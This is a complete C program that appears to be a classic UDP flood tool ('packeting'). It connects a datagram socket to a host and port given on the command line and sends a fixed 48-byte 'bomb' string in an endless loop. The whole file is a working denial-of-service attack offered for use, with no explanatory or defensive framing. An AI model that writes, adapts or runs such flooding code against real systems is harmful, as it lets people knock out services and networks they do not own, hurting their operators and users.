#define BOMB_STRING "1234567890ABCDEF1234567890ABCDEF1234567890ABCDEF"
#define BOMB_SIZE 48
 
#include <stdio.h>
#include <sys/param.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#include <stdarg.h>
 
int echo_connect(char *, short);
 
int echo_connect(char *server, short port)
{
   struct sockaddr_in sin;
   struct hostent *hp;
   int thesock;
   hp = gethostbyname(server);
   if (hp==NULL) {
      printf("Unknown host: %s\n",server);
      exit(0);
   }
   printf("Packeting %s:%d\n", server, port);
   bzero((char*) &sin,sizeof(sin));
   bcopy(hp->h_addr, (char *) &sin.sin_addr, hp->h_length);
   sin.sin_family = hp->h_addrtype;
   sin.sin_port = htons(port);
   thesock = socket(AF_INET, SOCK_DGRAM, 0);
   connect(thesock,(struct sockaddr *) &sin, sizeof(sin));
   return thesock;
}
 
 
main(int argc, char **argv)
{
   int s;
   if(argc != 3)
   {
      fprintf(stderr, "Syntax: %s host any_open_port\n",argv[0]);
      exit(0);
   }
   s=echo_connect(argv[1], atoi(argv[2]));
   for(;;)
   {
      send(s, BOMB_STRING, BOMB_SIZE, 0);
   }
}
